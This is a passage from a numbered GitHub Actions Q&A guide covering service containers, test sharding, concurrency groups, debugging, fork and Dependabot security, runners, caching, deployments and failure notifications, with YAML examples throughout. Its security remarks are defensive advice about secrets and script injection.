- **Job runs in a container** (`container` key): the job and the services are on the same Docker network, so connect using the service name as the host name and the container's own port. No port mapping is needed.

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    container: node:24
    services:
      postgres:
        image: postgres:17
        env:
          POSTGRES_PASSWORD: test
    steps:
      - run: psql "postgres://postgres:test@postgres:5432/postgres" -c "select 1"
```

A common bug is using `localhost` inside a container job, which points to the job container itself, not the database.

## 202: How do you run Playwright end-to-end tests in GitHub Actions?

Install dependencies, install the browsers with their system libraries, run the tests and upload the report when something fails.

```yaml
jobs:
  e2e:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v6
      - uses: actions/setup-node@v6
        with:
          node-version: 24
          cache: npm
      - run: npm ci
      - run: npx playwright install --with-deps
      - run: npx playwright test
      - uses: actions/upload-artifact@v6
        if: ${{ !cancelled() }}
        with:
          name: playwright-report
          path: playwright-report/
          retention-days: 14
```

The official Playwright Docker image (`mcr.microsoft.com/playwright`) can be used as a job container to skip the browser install step.

## 203: How do you split a slow test suite across parallel jobs?

Use a matrix of shard numbers and pass them to the test runner. Most runners support sharding (Playwright, Jest, Vitest).

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        shard: [1, 2, 3, 4]
    steps:
      - uses: actions/checkout@v6
      - uses: actions/setup-node@v6
        with:
          node-version: 24
          cache: npm
      - run: npm ci
      - run: npx playwright test --shard=${{ matrix.shard }}/${{ strategy.job-total }}
      - uses: actions/upload-artifact@v6
        if: ${{ !cancelled() }}
        with:
          name: blob-report-${{ matrix.shard }}
          path: blob-report/
```

A final job can download all the shard reports and merge them into one. Keep in mind each shard pays the setup cost (checkout, install), so going from 4 to 20 shards doesn't make it 5 times faster.

## 204: How do you publish test results and coverage from a workflow?

A few common ways:

- Upload the HTML or JUnit report as an artifact so people can download it.
- Write a short summary (passed, failed, coverage percent) to `$GITHUB_STEP_SUMMARY`.
- Use a test reporter action that reads JUnit XML and creates a check run with annotations for failed tests.
- Send coverage to a service like Codecov or Coveralls, which comments on the pull request.

```yaml
- run: npx vitest run --coverage --reporter=junit --outputFile=reports/junit.xml
- run: |
    pct=$(jq '.total.lines.pct' coverage/coverage-summary.json)
    echo "### Line coverage: ${pct}%" >> "$GITHUB_STEP_SUMMARY"
```

## 205: How do you deal with flaky tests in CI?

- Find them first. Track which tests fail and then pass on re-run. Many test runners and test reporting tools show this.
- Use the test runner's retry option (like Playwright's `retries`) only in CI and report retried tests, so they don't get hidden.
- Fix common causes: shared state between tests, fixed ports, timing based waits (`sleep`), dependence on test order, and real network calls.
- Quarantine tests that can't be fixed right away, with a ticket, instead of letting the whole team re-run CI over and over.

Re-running failed jobs again and again is the expensive way to handle flakiness. It wastes minutes and slowly teaches people to ignore red builds.

## 206: How do you use concurrency safely for deployments?

Put deploy jobs in a group per environment and don't cancel running deploys.

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    concurrency:
      group: deploy-production
      cancel-in-progress: false
    steps:
      - run: ./deploy.sh
```

With `cancel-in-progress: false`, a new deploy waits until the current one finishes. Cancelling a deploy halfway can leave servers or database migrations in a broken state. Remember that only one run can wait in the group, so if three deploys are triggered quickly, the middle one gets cancelled while waiting and only the latest one runs next.

## 207: What is the difference between workflow-level and job-level concurrency?

Workflow-level `concurrency` applies to the whole run. If the group is busy, the whole run waits or gets cancelled.

Job-level `concurrency` applies to one job. The rest of the workflow can still run in parallel.

```yaml
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true # cancel old CI runs for this branch

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: npm test
  deploy:
    needs: test
    runs-on: ubuntu-latest
    concurrency:
      group: deploy-staging # only one staging deploy at a time across all branches
    steps:
      - run: ./deploy.sh staging
```

Using both is common: workflow-level to cancel outdated CI, job-level to serialize deploys.

## 208: What happens to waiting runs in a concurrency group?

A group can have at most one running and one pending run or job. When a new one arrives:

- If `cancel-in-progress` is `true`, the running one is cancelled and the new one starts.
- If it's `false`, the new one becomes pending. If there was already a pending one, that older pending one is cancelled.

So concurrency groups are not a queue. They always keep only the latest waiting run. If you need every run to be processed in order, you need another solution, like a deploy tool that has its own queue.

## 209: How do you debug a failing workflow?

1. Read the failed step's log, and the steps before it. The real error is often a few lines above the last one.
2. Check the "Set up job" step for the runner image version, the token permissions and the action versions used.
3. Re-run the job with debug logging turned on.
4. Print the contexts you're using, like `echo '${{ toJSON(github.event) }}'`, to check values in conditions.
5. Compare with the last successful run: what changed in the code, the workflow file, the runner image or the action versions?
6. Try to reproduce it locally with the same versions, or in a container with the same image.

If it fails only sometimes, look at timing, network calls and shared resources.

## 210: How can you get a shell on a runner to debug a problem?

GitHub doesn't provide SSH into hosted runners. Some community actions, like `mxschmitt/action-tmate`, start a tmate session and print a link you can connect to.

```yaml
- name: Debug session
  if: failure() && runner.debug == '1'
  uses: mxschmitt/action-tmate@v3
  with:
    limit-access-to-actor: true
  timeout-minutes: 15
```

Be careful with this. Anyone who gets the link has a shell on a machine with your token and environment. Limit access to the person who started the run, add a timeout, and never leave it on by default. For self-hosted runners you can log in to the machine directly.

## 211: How do you run workflows locally?

`act` is a community tool that reads your workflow files and runs the jobs in Docker containers on your machine.

```bash
act                         # run the push event
act pull_request            # run the pull_request event
act -j test                 # run only the "test" job
act -s NPM_TOKEN=xxx        # pass a secret
act -l                      # list jobs
```

It's useful for quick feedback, but it's not identical to GitHub. The container images differ from real runner images, and features like OIDC, caching, artifacts, service containers or `GITHUB_TOKEN` API calls behave differently or need extra setup. Use it for checking logic and scripts, and still test the real thing on GitHub.

## 212: How do you see the full event payload of a run?

Print the `github` context or just the event as JSON. Pass it through an environment variable instead of putting it directly in the script, so quotes in the payload can't break the shell command.

```yaml
- name: Dump event
  run: echo "$EVENT" | jq .
  env:
    EVENT: ${{ toJSON(github.event) }}
```

The raw payload file is also on disk at `$GITHUB_EVENT_PATH`. The GitHub webhook documentation shows the full shape of each event's payload.

## 213: What problem do path filters cause with required status checks?

If a workflow is skipped because of `paths` or `branches` filters, its checks never report. If those checks are required, the pull request stays at "Expected, waiting for status to be reported" forever and can't be merged.

Common fixes:

- Don't use path filters on the trigger of required workflows. Let the workflow always run, and skip the expensive jobs inside it with a "changes" job and `if` conditions. A skipped job counts as passed for required checks.
- Make only one final "ci-ok" job required, and have it check the results of the others.

## 214: How do you run only the affected parts of a monorepo in CI?

Detect what changed, then run only the jobs for those parts.

```yaml
jobs:
  changes:
    runs-on: ubuntu-latest
    outputs:
      api: ${{ steps.filter.outputs.api }}
      web: ${{ steps.filter.outputs.web }}
    steps:
      - uses: actions/checkout@v6
      - uses: dorny/paths-filter@v3
        id: filter
        with:
          filters: |
            api:
              - 'apps/api/**'
              - 'packages/shared/**'
            web:
              - 'apps/web/**'
              - 'packages/shared/**'

  api:
    needs: changes
    if: needs.changes.outputs.api == 'true'
    runs-on: ubuntu-latest
    steps:
      - run: echo "Testing api"
```

Build tools like Nx and Turborepo can do the same with their "affected" commands, which also know about dependencies between packages.

## 215: How do you get the list of files changed in a pull request?

Use the GitHub CLI or API, which doesn't need any git history:

```yaml
- run: gh pr diff "$PR" --name-only > changed.txt
  env:
    GH_TOKEN: ${{ github.token }}
    GH_REPO: ${{ github.repository }}
    PR: ${{ github.event.pull_request.number }}
```

Or use git, which needs the base branch history:

```yaml
- uses: actions/checkout@v6
  with:
    fetch-depth: 0
- run: git diff --name-only "origin/${{ github.base_ref }}...HEAD"
```

Be careful when using file names in scripts. File names come from the pull request author and can contain spaces or special characters.

## 216: What does fetch-depth do in actions/checkout?

It sets how many commits of history are fetched. The default is `1`, a shallow clone with only the commit being built, which is the fastest.

`fetch-depth: 0` fetches the full history of all branches and tags. You need it for tools that read git history, like changelog generators, `git describe`, versioning tools, or comparing with the base branch.

```yaml
- uses: actions/checkout@v6
  with:
    fetch-depth: 0
```

Full history can be slow for big repositories. Options like `filter: blob:none` (fetch history without file contents) help in that case.

## 217: How do you check out another repository?

Use the `repository` input, and put it in a separate folder with `path`. For a private repository, pass a token that has access to it.

```yaml
steps:
  - uses: actions/checkout@v6
  - uses: actions/checkout@v6
    with:
      repository: my-org/shared-config
      ref: main
      path: shared-config
      token: ${{ steps.app-token.outputs.token }}
```

`GITHUB_TOKEN` only has access to the current repository, so for other private repositories you need a GitHub App token, a fine-grained token or a deploy key (`ssh-key` input).

## 218: How do you check out submodules?

Set `submodules` to `true` or `recursive`.

```yaml
- uses: actions/checkout@v6
  with:
    submodules: recursive
    token: ${{ secrets.SUBMODULES_TOKEN }}
```

If the submodules are private and in other repositories, the default `GITHUB_TOKEN` can't read them, so you need a token or SSH key with access to those repositories. Submodule URLs in `.gitmodules` should use `https://github.com/...` when you use a token, and `git@github.com:...` when you use an SSH key.

## 219: What code does a pull_request workflow run on?

By default, `actions/checkout` checks out `refs/pull/<number>/merge`, a merge commit GitHub creates of the pull request branch into the base branch. So the tests run against the result of the merge, not the branch alone.

If the pull request has merge conflicts, there is no merge commit and `pull_request` workflows don't run. To test the exact head of the branch instead, check out `github.event.pull_request.head.sha`:

```yaml
- uses: actions/checkout@v6
  with:
    ref: ${{ github.event.pull_request.head.sha }}
```

## 220: What is the pull_request_target event?

`pull_request_target` runs on pull request activity, like `pull_request`, but in the context of the **base** repository. The workflow file comes from the default branch, not from the pull request, and the run has access to secrets and a token that can write, even for pull requests from forks.

It's meant for tasks that don't need to run the pull request's code, like adding labels, posting a welcome comment or checking the title. By default it does not check out the pull request code, and you should keep it that way unless you really know what you're doing.

## 221: What is the difference between pull_request and pull_request_target?

|                    | `pull_request`                | `pull_request_target` |
| ------------------ | ----------------------------- | --------------------- |
| Workflow file from | the pull request merge commit | the default branch    |
| Default checkout   | the PR merge commit           | the default branch    |
| Secrets for forks  | no                            | yes                   |
| Token for forks    | read-only                     | can have write access |

Using `pull_request_target` and then checking out and running the pull request's code (like `npm install` or `npm test`) is a well-known way to get secrets stolen. An attacker only needs to open a pull request with a modified `package.json` script.

## 222: How do you handle pull requests from forks that need secrets?

Split the work into two workflows:

1. A `pull_request` workflow that runs the untrusted code with no secrets and uploads its results (like a coverage file or a build) as an artifact.
2. A `workflow_run` workflow that runs after the first one, in the base repository context with secrets, downloads the artifact and does the privileged part, like posting a comment or uploading coverage.

Treat the artifact as untrusted data: don't execute it, and validate anything you read from it. Another option is to require a maintainer to approve the run through an environment with required reviewers, but the reviewer must check the code first, because the code still runs with secrets.

## 223: What is the merge_group event?

`merge_group` is triggered when a pull request is added to a merge queue. GitHub creates a temporary branch with the pull request on top of the queue's earlier entries, and your checks run against it.

```yaml
on:
  pull_request:
  merge_group:
```

If your required checks don't listen to `merge_group`, the merge queue waits for checks that never run. Add it to every workflow that provides a required check.

## 224: What are the caveats of scheduled workflows?

- Times are in UTC.
- They run on the latest commit of the default branch only.
- They can be delayed, or in rare cases dropped, during busy times. Runs at the start of an hour are the busiest, so pick an odd minute like `17 3 * * *`.
- The minimum interval is 5 minutes.
- In public repositories, scheduled workflows are disabled automatically after 60 days without repository activity.
- A change to the cron line only takes effect after it's merged to the default branch.

Don't use a schedule for anything that needs exact timing.

## 225: How do you run a job only when a pull request has a certain label?

Check the labels in the event payload with `contains`. Add `labeled` to the types so the job also runs when the label is added later.

```yaml
on:
  pull_request:
    types: [opened, synchronize, reopened, labeled]

jobs:
  e2e:
    if: contains(github.event.pull_request.labels.*.name, 'run-e2e')
    runs-on: ubuntu-latest
    steps:
      - run: echo "Running E2E tests"
```

`labels.*.name` is an object filter: it takes the `name` of every item in the `labels` array.

## 226: How do you run a job based on the commit message?

Read it from the event payload. For `push` it's `github.event.head_commit.message`.

```yaml
jobs:
  deploy:
    if: github.event_name == 'push' && !contains(github.event.head_commit.message, '[no deploy]')
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
```

For pull requests the payload doesn't include commit messages, so you need the API. Never put the commit message directly in a `run` script with `${{ }}`, because anyone who can push a commit controls that text.

## 227: What is the difference between a step's outcome and conclusion?

`steps.<id>.outcome` is the result of the step before `continue-on-error` is applied. `steps.<id>.conclusion` is the result after it.

```yaml
- id: lint
  run: npm run lint
  continue-on-error: true

- run: |
    echo "outcome: ${{ steps.lint.outcome }}"       # failure
    echo "conclusion: ${{ steps.lint.conclusion }}" # success
```

Use `outcome` when you want to know if the step really failed, even if it was allowed to fail.

## 228: How do you write a table to the job summary?

Write Markdown table rows to `$GITHUB_STEP_SUMMARY`.

```yaml
- run: |
    {
      echo "## Bundle size"
      echo ""
      echo "| File | Size |"
      echo "| --- | --- |"
      for f in dist/assets/*.js; do
        echo "| $(basename "$f") | $(du -h "$f" | cut -f1) |"
      done
    } >> "$GITHUB_STEP_SUMMARY"
```

Each step's summary can be up to 1 MiB. In JavaScript actions or `actions/github-script`, the `core.summary` helper builds the same thing with methods like `addHeading` and `addTable`.

## 229: What are problem matchers?

A problem matcher is a JSON file with regular expressions that scan a step's output for errors and warnings, and turn matching lines into annotations with a file and line number.

```json
{
  "problemMatcher": [
    {
      "owner": "my-linter",
      "pattern": [
        {
          "regexp": "^(.+):(\\d+):(\\d+): (error|warning): (.+)$",
          "file": 1,
          "line": 2,
          "column": 3,
          "severity": 4,
          "message": 5
        }
      ]
    }
  ]
}
```

```yaml
- run: echo "::add-matcher::.github/my-linter-matcher.json"
- run: ./my-linter src/
```

Many setup actions (like `setup-node` and `setup-python`) register matchers for their tools automatically.

## 230: How do you set a multi-line value in GITHUB_OUTPUT or GITHUB_ENV?

Use the heredoc-like syntax with a delimiter:

```yaml
- id: notes
  run: |
    {
      echo "body<<EOF_NOTES"
      git log --oneline -10
      echo "EOF_NOTES"
    } >> "$GITHUB_OUTPUT"
```

The delimiter must not appear in the value itself. If the value comes from outside (like a pull request body), use a random delimiter such as `EOF_$(openssl rand -hex 8)`, otherwise someone could end the value early and inject extra outputs or environment variables.

## 231: Can you use YAML anchors in workflow files?

Yes. Since 2025, GitHub Actions supports YAML anchors (`&name`) and aliases (`*name`), which lets you reuse a block without repeating it.

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    env: &shared-env
      NODE_ENV: test
      TZ: UTC
    steps:
      - run: npm test
  e2e:
    runs-on: ubuntu-latest
    env: *shared-env
    steps:
      - run: npm run e2e
```

Merge keys (`<<: *anchor`) are not supported, so you can reuse a whole block but not reuse it and change a few keys. For bigger reuse, composite actions and reusable workflows are still the better tools.

## 232: Where can configuration variables be defined and which one wins?

Variables can be defined at three levels: organization, repository and environment. If the same name exists at more than one level, the most specific one wins:

1. Environment variable (only for jobs using that environment)
2. Repository variable
3. Organization variable

```bash
gh variable set API_URL --body https://api.example.com
gh variable set API_URL --env staging --body https://staging-api.example.com
gh variable set DEFAULT_REGION --org my-org --body eu-west-1 --visibility all
```

This lets you write `vars.API_URL` once and get the right value for each environment.

## 233: How are secrets with the same name resolved?

The same way as variables: environment secrets override repository secrets, and repository secrets override organization secrets.

A typical setup puts `DEPLOY_TOKEN` on both the `staging` and `production` environments with different values. The workflow always uses `secrets.DEPLOY_TOKEN`, and the value depends on which environment the job uses.

## 234: What are the limits for secrets?

- A secret can be up to 48 KB.
- A repository can have up to 100 secrets, an environment up to 100, and an organization up to 1,000.
- A workflow can use at most 100 organization secrets (if more are shared with the repository, only the first 100 alphabetically are available).

For larger values, like a big certificate bundle, encrypt the file and store it in the repository, and keep only the decryption key as a secret. Or better, store it in a cloud secret manager and read it at run time with OIDC.

## 235: How do you store a file or multi-line value as a secret?

Secrets can hold multi-line text, so you can paste a PEM key directly. Many people still base64 encode files to avoid problems with whitespace and binary data.

```bash
base64 -i signing-key.p12 | gh secret set SIGNING_KEY_B64
```

```yaml
- run: echo "$SIGNING_KEY_B64" | base64 -d > "$RUNNER_TEMP/signing-key.p12"
  env:
    SIGNING_KEY_B64: ${{ secrets.SIGNING_KEY_B64 }}
```

Note that masking works on the stored secret value. Once you decode it, the decoded content is not masked, so never print it.

## 236: How do workflows run for Dependabot pull requests?

Workflows triggered by Dependabot (`github.actor == 'dependabot[bot]'`) are treated like pull requests from a fork:

- `GITHUB_TOKEN` is read-only by default.
- Normal Actions secrets are not available. Only **Dependabot secrets** are, which you set separately under Settings, Secrets and variables, Dependabot.

So if your CI needs a private registry token to install packages, add it as a Dependabot secret too. Otherwise Dependabot pull requests will fail while normal pull requests pass.

## 237: How do you auto-merge Dependabot pull requests?

Use `dependabot/fetch-metadata` to see the update type, and enable auto-merge for patch and minor updates. The pull request will merge on its own once required checks pass.

```yaml
on: pull_request

permissions:
  contents: write
  pull-requests: write

jobs:
  automerge:
    if: github.event.pull_request.user.login == 'dependabot[bot]'
    runs-on: ubuntu-latest
    steps:
      - id: meta
        uses: dependabot/fetch-metadata@v2
      - if: steps.meta.outputs.update-type != 'version-update:semver-major'
        run: gh pr merge --auto --squash "$PR_URL"
        env:
          PR_URL: ${{ github.event.pull_request.html_url }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

Auto-merge has to be enabled in the repository settings, and this only makes sense when your test suite is good enough to catch broken updates.

## 238: What are larger runners?

Larger runners are GitHub-hosted runners with more CPU, RAM and disk than the standard ones, and options like GPUs, ARM, static IP addresses and Azure private networking. They're available on Team and Enterprise plans.

An admin creates them in the organization settings and gives them a name, then you target them with that name or their group:

```yaml
runs-on: ubuntu-24-16core
```

They're always billed per minute, at a higher rate than standard runners, so use them for jobs that really benefit, like big builds or heavy test suites.

## 239: How do you run jobs on ARM64?

Use the ARM64 hosted runner labels. For Linux there are `ubuntu-24.04-arm` and `ubuntu-22.04-arm`, and for Windows `windows-11-arm`. macOS runners on Apple silicon (`macos-latest`) are ARM64 too.

```yaml
jobs:
  build:
    strategy:
      matrix:
        runner: [ubuntu-24.04, ubuntu-24.04-arm]
    runs-on: ${{ matrix.runner }}
    steps:
      - uses: actions/checkout@v6
      - run: uname -m
```

Native ARM runners are much faster than building ARM binaries or images under QEMU emulation. Check that all actions and tools you use support ARM.

## 240: What should you watch for when running jobs on Windows and macOS?

- **Cost:** in private repos, Windows and macOS minutes cost more than Linux.
- **Shell:** the default shell on Windows is `pwsh`, so bash scripts need `shell: bash` (Git Bash is installed).
- **Paths and line endings:** use `/` or let tools build paths, and watch out for `\r\n` from git's `autocrlf`.
- **Containers:** `container` and `services` only work on Linux runners.
- **Speed:** Windows runners are often slower at file-heavy work like `npm ci`.
- **Concurrency:** macOS has a lower limit for parallel jobs.

A common approach is to run the full suite on Linux and a smaller smoke test on Windows and macOS.

## 241: How do you set up a self-hosted runner?

1. In the repository, organization or enterprise settings, go to Actions, then Runners, then "New self-hosted runner".
2. Follow the commands for your OS to download the runner, then configure it with the given registration token.
3. Start it, or install it as a service.

```bash
./config.sh --url https://github.com/my-org --token <REGISTRATION_TOKEN> \
  --labels linux,x64,gpu --name build-01
sudo ./svc.sh install
sudo ./svc.sh start
```

The runner connects out to GitHub over HTTPS, so you don't need to open any inbound ports. In practice, most teams use autoscaling (like Actions Runner Controller on Kubernetes) instead of setting up machines by hand.

## 242: What are runner labels and runner groups?

**Labels** describe a runner, like `self-hosted`, `linux`, `x64`, `gpu` or `large`. A job runs on a runner that has all the labels listed in `runs-on`.

**Runner groups** control who can use which runners. An organization admin can create a group, put runners in it, and choose which repositories (and which workflows) can use it. This way, the production deploy runners with access to the internal network can only be used by the deploy repository.

## 243: How do you target a runner group in runs-on?

Use the object form with `group`, and optionally `labels`.

```yaml
jobs:
  build:
    runs-on:
      group: linux-builders
      labels: [linux, x64]
```

The job will only run on a runner that is in that group and has all the listed labels. This is also how you target larger runners when they're organized in groups.

## 244: How do you write workflow scripts that work on Linux, Windows and macOS?

- Set `shell: bash` for steps that need to run on all three, so you write one bash script.
- Or write the logic in Node.js or Python, which behave the same everywhere.
- Use `runner.os` checks for the parts that really differ, like installing system packages.
- Use `${{ runner.temp }}` and `$GITHUB_WORKSPACE` instead of `/tmp` or hard-coded paths.
- Add a `.gitattributes` with `* text=auto eol=lf` if scripts or snapshot tests break on Windows line endings.

```yaml
defaults:
  run:
    shell: bash
```

## 245: How do you use a private image as a job container?

Add `credentials` to the `container` (or service) definition.

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    container:
      image: ghcr.io/my-org/build-image:2.3.0
      credentials:
        username: ${{ github.actor }}
        password: ${{ secrets.GITHUB_TOKEN }}
    permissions:
      contents: read
      packages: read
    steps:
      - uses: actions/checkout@v6
      - run: make build
```

For other registries like Docker Hub or ECR, use a username and token stored as secrets. Pinning the image by digest (`@sha256:...`) makes builds repeatable.

## 246: How do you use Docker Compose in a workflow?

Docker and the `docker compose` plugin are installed on Linux hosted runners, so you can use them directly.

```yaml
steps:
  - uses: actions/checkout@v6
  - run: docker compose -f compose.ci.yml up -d --wait
  - run: npm ci && npm run test:integration
  - if: failure()
    run: docker compose -f compose.ci.yml logs
  - if: always()
    run: docker compose -f compose.ci.yml down -v
```

`--wait` waits until the services are running and healthy. Compose is handy when your local dev setup already uses it, so CI and local tests run the same stack. Service containers are simpler for one or two databases.

## 247: How do you cache dependencies for pnpm and Yarn?

With `actions/setup-node` you set `cache` to `pnpm` or `yarn`. For pnpm, install pnpm first so setup-node can find its store.

```yaml
- uses: actions/checkout@v6
- uses: pnpm/action-setup@v4
- uses: actions/setup-node@v6
  with:
    node-version: 24
    cache: pnpm
- run: pnpm install --frozen-lockfile
```

For Yarn (Berry), enable Corepack first:

```yaml
- run: corepack enable
- uses: actions/setup-node@v6
  with:
    node-version: 24
    cache: yarn
- run: yarn install --immutable
```

`pnpm/action-setup` reads the pnpm version from the `packageManager` field in `package.json` when you don't set one.

## 248: Why use npm ci instead of npm install in CI?

`npm ci`:

- installs exactly what's in `package-lock.json`
- fails if `package.json` and the lock file don't match
- deletes `node_modules` first, so there's no leftover state
- never writes to `package.json` or the lock file

`npm install` can update the lock file and resolve different versions, so two CI runs could install different dependencies. CI should test what's committed, so `npm ci` (or `pnpm install --frozen-lockfile`, `yarn install --immutable`) is the right choice.

## 249: Should lint, tests and build be separate jobs or steps in one job?

**One job with many steps:** setup (checkout, install) runs once, so it uses fewer minutes. But steps run in sequence, and if lint fails, tests don't run.

**Separate jobs:** they run in parallel, so feedback is faster, and each one shows up as its own check. But each job repeats checkout and install, which costs more minutes.

A common middle ground: one fast job for lint and type check, a separate (maybe sharded) test job, and a build job. Use good caching so the repeated installs are cheap.

## 250: How do you speed up a slow workflow?

Look at the timing of each step first, then:

- Cache dependencies and build tool caches.
- Run independent jobs in parallel, and shard long test suites.
- Use `concurrency` with `cancel-in-progress` so outdated runs don't take runners.
- Skip work that isn't needed with path filters or affected-only builds.
- Use shallow clones, and sparse checkout for big monorepos.
- Use prebuilt Docker images or job containers with tools already installed.
- Use Docker layer caching for image builds.
- Use larger or ARM runners for CPU-heavy jobs.
- Avoid long `sleep` and wait loops. Use health checks instead.

## 251: How do you reduce GitHub Actions costs?

- Cancel outdated runs with `concurrency` and `cancel-in-progress`.
- Don't run everything on every event. Use path filters, affected-only builds and skip docs-only changes.
- Run most jobs on Linux. Use Windows and macOS only where needed.
- Set `timeout-minutes` so stuck jobs don't run for 6 hours.
- Cache dependencies, and avoid redundant matrix entries.
- Set short `retention-days` for big artifacts.
- Use self-hosted or ARM runners for heavy jobs if the numbers work out.
- Check the usage report in billing settings to find the most expensive workflows, and set budgets with alerts.

Remember that short jobs are rounded up to a full minute, so splitting work into many tiny jobs can cost more than one bigger job.

## 252: How do you retry a step that sometimes fails because of the network?

There's no built-in `retry` key for steps. You can write a small loop in the script:

```yaml
- name: Download dataset
  shell: bash
  run: |
    for i in 1 2 3; do
      curl -fsSL https://example.com/data.zip -o data.zip && break
      echo "Attempt $i failed, waiting..."
      sleep $((i * 10))
    done
    test -f data.zip
```

Many tools have their own retry options (`curl --retry`, `npm`'s fetch retries settings, Gradle and Maven settings). Some community actions wrap a command with retries too. Only retry things that fail for temporary reasons, not tests.

## 253: How do rulesets work with GitHub Actions checks?

Rulesets (the newer version of branch protection) let you require status checks before merging, and they can apply to many branches or many repositories at once from the organization level.

There is also a "Require workflows to pass before merging" rule at the organization level. It forces a workflow from a central repository to run on pull requests in the targeted repositories, even if those repositories don't have it in their own `.github/workflows` folder. That's useful for security scans or policy checks that every repository must pass. It replaced the older "required workflows" feature.

## 254: How do you share workflows and actions across an organization?

- **Reusable workflows** in a central repository, called with `uses: org/repo/.github/workflows/x.yml@v1`.
- **Composite or JavaScript actions** in their own repositories or in one "actions" monorepo.
- **Workflow templates** in the organization's `.github` repository, so new repositories start from approved workflows.
- **Rulesets with required workflows** for checks every repository must run.

For private or internal repositories, the repository holding the shared workflows and actions must allow access from other repositories in its Actions settings. Version shared workflows with tags, like any library.

## 255: How do you create workflow templates for an organization?

Put them in the `workflow-templates/` folder of the organization's public `.github` repository (private and internal templates work on some plans). Each template has a YAML file and a `.properties.json` file with the same name.

```
.github/
  workflow-templates/
    node-ci.yml
    node-ci.properties.json
```

```json
{
  "name": "Company Node.js CI",
  "description": "Standard CI for Node.js services",
  "iconName": "octicon package",
  "categories": ["JavaScript", "TypeScript"],
  "filePatterns": ["package.json$"]
}
```

In the template YAML you can use `$default-branch`, which is replaced with the repository's default branch when someone adds it.

## 256: How do you organize many workflow files in one repository?

- Split by purpose, with clear names: `ci.yml`, `deploy.yml`, `release.yml`, `nightly.yml`, `pr-triage.yml`.
- Move repeated jobs into reusable workflows in the same folder, and repeated steps into composite actions under `.github/actions/`.
- Give every workflow, job and important step a `name`, so the Actions tab and pull request checks are readable.
- Keep long scripts in a `scripts/` folder instead of inline `run` blocks.
- Add a CODEOWNERS entry for `.github/` so changes to CI get reviewed by the right people.

Remember that GitHub only reads files directly in `.github/workflows/`, so you can't use subfolders there.

## 257: How do you deploy to Kubernetes from GitHub Actions?

A common flow is: build and push an image, get cluster credentials (ideally with OIDC), then update the deployment.

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/checkout@v6
      - uses: aws-actions/configure-aws-credentials@v5
        with:
          role-to-assume: ${{ vars.DEPLOY_ROLE_ARN }}
          aws-region: eu-west-1
      - run: aws eks update-kubeconfig --name prod-cluster
      - run: |
          kubectl set image deployment/api api=ghcr.io/acme/api:${{ github.sha }}
          kubectl rollout status deployment/api --timeout=5m
```

Many teams use GitOps instead (Argo CD or Flux): the workflow only updates the image tag in a config repository, and the tool inside the cluster applies it. Then CI never needs direct access to the cluster.

## 258: How do you deploy to a server over SSH?

Store the private key as a secret, write it to a file, add the host key, and run commands or copy files.

```yaml
- name: Deploy over SSH
  env:
    SSH_KEY: ${{ secrets.DEPLOY_SSH_KEY }}
    KNOWN_HOSTS: ${{ vars.DEPLOY_KNOWN_HOSTS }}
  run: |
    mkdir -p ~/.ssh
    echo "$SSH_KEY" > ~/.ssh/id_ed25519
    chmod 600 ~/.ssh/id_ed25519
    echo "$KNOWN_HOSTS" >> ~/.ssh/known_hosts
    rsync -az --delete dist/ deploy@app.example.com:/var/www/app/
    ssh deploy@app.example.com 'sudo systemctl reload app'
```

Store the server's host key instead of using `StrictHostKeyChecking=no`, so you don't connect to the wrong machine. Use a deploy user with only the rights it needs. If the server isn't reachable from the internet, use a self-hosted runner in the same network.

## 259: How do you create preview deployments for pull requests?

Deploy each pull request to its own URL, and post the link on the pull request.

```yaml
on:
  pull_request:

concurrency:
  group: preview-${{ github.event.pull_request.number }}
  cancel-in-progress: true

jobs:
  preview:
    if: github.event.pull_request.head.repo.full_name == github.repository
    runs-on: ubuntu-latest
    environment:
      name: preview
      url: https://pr-${{ github.event.pull_request.number }}.preview.example.com
    steps:
      - uses: actions/checkout@v6
      - run: npm ci && npm run build
      - run: ./scripts/deploy-preview.sh "${{ github.event.pull_request.number }}"
```

The `if` skips pull requests from forks, because they don't get secrets. Many hosting platforms (Vercel, Netlify, Cloudflare Pages) do previews on their own through their GitHub app.

## 260: How do you clean up preview environments when a pull request closes?

Run a workflow on `pull_request` with `types: [closed]` and delete the resources.

```yaml
on:
  pull_request:
    types: [closed]

jobs:
  cleanup:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - run: ./scripts/delete-preview.sh "${{ github.event.pull_request.number }}"
```

This runs on both merge and close without merge. It's also smart to add a scheduled job that removes previews older than a few days, in case a cleanup run fails.

## 261: How do you send a Slack notification when a workflow fails?

Add a final step or job with `if: failure()` that posts to a Slack incoming webhook.

```yaml
- name: Notify Slack
  if: failure() && github.ref == 'refs/heads/main'
  run: |
    curl -sS -X POST -H 'Content-type: application/json' \
      --data "{\"text\":\"CI failed on main: $RUN_URL\"}" \
      "$SLACK_WEBHOOK_URL"
  env:
    SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK_URL }}
    RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
```

Slack also has an official action, `slackapi/slack-github-action`. Notify only for things people need to act on, like failures on `main` or deploys, otherwise people mute the channel.

## 262: How do you open an issue automatically when a scheduled job fails?

Add a step that runs on failure and creates an issue with the GitHub CLI. The job needs `issues: write`.

```yaml
permissions:
  contents: read
  issues: write

jobs:
  nightly:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - run: npm ci && npm run test:nightly
      - if: failure()
        run: |
          gh issue create \
            --title "Nightly tests failed on $(date -u +%F)" \
            --body "See $RUN_URL" \
            --label ci-failure
        env:
          GH_TOKEN: ${{ github.token }}
          GH_REPO: ${{ github.repository }}
          RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
```

To avoid a new issue every night, search for an open issue with that label first and add a comment instead.

## 263: How do you list, cancel or re-run workflow runs through the API?

